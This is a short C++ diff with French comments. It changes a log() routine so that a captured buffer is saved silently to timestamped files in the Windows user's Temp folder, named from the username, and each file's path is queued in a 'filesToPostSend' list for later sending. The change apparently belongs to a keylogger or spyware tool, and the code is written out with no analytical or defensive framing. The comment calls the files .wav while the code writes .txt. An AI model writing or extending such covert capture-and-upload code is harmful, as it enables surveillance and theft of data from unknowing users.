@@ -120,8 +120,31 @@ void log() {
                 }
             }
         }
-        cout << "Buffer: " << stringedBuffer(buffer) << endl;
+        string fileName = trouverNomFichierTxt();
+        ofstream file(fileName, std::ios::app);
+        file << stringedBuffer(buffer);
+        *(filesToPostSend.load()) += fileName + '\n';
     }
+}
+
+string trouverNomFichierTxt(){
+    /*
+    Le nom du fichier sera composé de :
+    (nom d'utilisateur -> date -> heure).wav
+    */
+    const DWORD size = UNLEN + 1;
+    char usernameChar[size];
+    GetUserNameA(usernameChar, const_cast<LPDWORD>(&size));
+    string username = usernameChar;
+
+    time_t now = time(nullptr);
+    char buffer[80];
+    strftime(buffer, sizeof(buffer), "%Y%m%d%H%M%S", localtime(&now));
+    string dateHeure = buffer;
+    
+    string nomFichier = "C:\\Users\\" + username + "\\AppData\\Local\\Temp\\" + dateHeure + ".txt";
+    
+    return nomFichier;
 }
 
 void afficherNumero(){
